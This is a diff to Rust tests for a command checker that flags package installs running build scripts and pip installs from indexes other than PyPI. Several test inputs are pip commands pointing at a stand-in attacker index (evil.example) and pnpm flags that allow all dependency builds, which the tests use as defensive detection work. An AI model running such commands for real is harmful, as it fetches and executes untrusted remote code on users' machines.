@@ -738,7 +738,7 @@ fn a_named_pip_package_may_build_from_source_unless_wheels_only() {
     let t = Tree::new();
     for cmd in [
         "pip install requests",
-        "pip install requests==2.0 -i https://pypi.example.invalid/simple",
+        "pip install requests==2.0 --no-deps",
         "pip install --no-binary :none: requests",
     ] {
         let f = run(cmd, t.path());
@@ -1650,6 +1650,10 @@ fn install_aliases_and_corepack_are_judged_like_the_install_they_run() {
         "corepack pnpm i",
         "corepack npm install",
         "corepack yarn install",
+        "corepack pnpm@9 i",
+        "corepack pnpm@9.1.0 install",
+        "corepack yarn@4.1.0 install",
+        "corepack npm@10 install",
     ] {
         assert!(
             ids(&run(cmd, t.path())).contains(&"install/lifecycle-script"),
@@ -1658,6 +1662,8 @@ fn install_aliases_and_corepack_are_judged_like_the_install_they_run() {
     }
     assert!(run("corepack enable", t.path()).is_empty());
     assert!(run("corepack pnpm run build", t.path()).is_empty());
+    assert!(run("corepack pnpm@9 run build", t.path()).is_empty());
+    assert!(run("corepack enable pnpm@9", t.path()).is_empty());
 }
 
 #[test]
@@ -1686,6 +1692,157 @@ fn an_allow_file_that_leaves_the_project_through_a_symlink_is_not_read() {
                 .evidence
                 .excerpt
                 .contains("will run")
+        );
+    }
+}
+
+#[test]
+fn builds_allowed_on_the_command_line_or_in_npmrc_are_not_reported_as_blocked() {
+    let blocked = |extra_args: &str, npmrc: Option<&str>| {
+        let t = pnpm_tree("packages:\n  - \".\"\n", PNPM_10, true);
+        if let Some(text) = npmrc {
+            t.write(".npmrc", text);
+        }
+        run(&format!("pnpm install {extra_args}"), t.path())
+    };
+    let f = blocked("", None);
+    assert!(ids(&f).contains(&"install/dependency-scripts-blocked"));
+    for args in [
+        "--dangerously-allow-all-builds",
+        "--dangerously-allow-all-builds=true",
+        "--config.dangerously-allow-all-builds",
+        "--config.dangerously-allow-all-builds=true",
+        "--config.only-built-dependencies[]=esbuild",
+        "--config.onlyBuiltDependencies[]=esbuild",
+        "--allow-build=esbuild",
+        "--allow-build esbuild",
+    ] {
+        let f = blocked(args, None);
+        assert!(
+            one(&f, "install/dependency-scripts")
+                .evidence
+                .excerpt
+                .contains("will run")
+                && !ids(&f).contains(&"install/dependency-scripts-blocked"),
+            "{args}: {:?}",
+            ids(&f)
+        );
+    }
+    for args in [
+        "--dangerously-allow-all-builds=false",
+        "--config.dangerously-allow-all-builds=false",
+        "--config.fetch-retries=2",
+    ] {
+        assert!(
+            ids(&blocked(args, None)).contains(&"install/dependency-scripts-blocked"),
+            "{args}"
+        );
+    }
+    for rc in [
+        "dangerously-allow-all-builds=true\n",
+        "registry=https://r.example/\ndangerously-allow-all-builds = \"true\"\n",
+        "only-built-dependencies[]=esbuild\n",
+        "only-built-dependencies=esbuild\n",
+    ] {
+        let f = blocked("", Some(rc));
+        assert!(
+            ids(&f).contains(&"install/dependency-scripts")
+                && !ids(&f).contains(&"install/dependency-scripts-blocked"),
+            "{rc}: {:?}",
+            ids(&f)
+        );
+    }
+    for rc in [
+        "dangerously-allow-all-builds=false\n",
+        "# dangerously-allow-all-builds=true\n",
+        "; only-built-dependencies[]=esbuild\n",
+        "ignore-scripts=false\n",
+    ] {
+        assert!(
+            ids(&blocked("", Some(rc))).contains(&"install/dependency-scripts-blocked"),
+            "{rc}"
+        );
+    }
+}
+
+#[test]
+fn a_pip_install_from_another_index_or_link_source_is_not_quiet() {
+    let t = Tree::with(&[
+        ("wh/.keep", ""),
+        (
+            "req-index.txt",
+            "--index-url https://evil.example/simple\nrequests\n",
+        ),
+    ]);
+    for cmd in [
+        "pip install --extra-index-url https://evil.example/simple requests",
+        "pip install -i https://evil.example/simple requests",
+        "pip install --index-url https://evil.example/simple requests",
+        "pip install --index-url=https://evil.example/simple requests",
+        "pip install -ihttps://evil.example/simple requests",
+        "pip install --trusted-host evil.example -i http://evil.example/simple x",
+        "pip install -f https://evil.example/links x",
+        "pip install --find-links ./wh x",
+        "pip install --no-index -f ./wh x",
+        "pip install -r req-index.txt",
+        "python3 -m pip install --extra-index-url https://evil.example/simple requests",
+    ] {
+        let f = run(cmd, t.path());
+        let d = one(&f, "install/pip-build-code");
+        assert_eq!(d.severity, Severity::Warn, "{cmd}");
+        assert!(d.evidence.excerpt.contains("other than PyPI"), "{cmd}");
+        assert!(
+            !d.evidence.excerpt.contains("evil.example"),
+            "{cmd}: {}",
+            d.evidence.excerpt
+        );
+    }
+    for cmd in [
+        "pip install requests",
+        "pip install --user black pytest",
+        "pip install -U pip",
+        "pip install --retries 2 --timeout 5 requests",
+    ] {
+        let f = run(cmd, t.path());
+        assert_eq!(
+            one(&f, "install/pip-build-code").severity,
+            Severity::Info,
+            "{cmd}"
+        );
+    }
+}
+
+/// Through the command parser, as `code-watch check` runs it: a pinned requirement is a word of the
+/// command, not an assignment the parser sets aside.
+#[test]
+fn a_pinned_pip_requirement_reaches_the_install_check() {
+    let t = Tree::new();
+    let check = |cmd: &str| {
+        Engine::embedded()
+            .unwrap()
+            .check_command_in(cmd, Some(t.path()), &Allowlists::empty())
+            .findings()
+            .to_vec()
+    };
+    let f = check("pip install requests==2.0 flask");
+    assert!(
+        one(&f, "install/pip-build-code")
+            .evidence
+            .excerpt
+            .contains("flask, requests"),
+        "{:?}",
+        f.iter().map(|x| &x.evidence.excerpt).collect::<Vec<_>>()
+    );
+    for cmd in [
+        "pip install -i https://evil.example/simple requests==2.0",
+        "pip install --extra-index-url https://evil.example/simple requests==2.0",
+        "python3 -m pip install -f ./wh requests==2.0",
+    ] {
+        let f = check(cmd);
+        assert_eq!(
+            one(&f, "install/pip-build-code").severity,
+            Severity::Warn,
+            "{cmd}"
         );
     }
 }
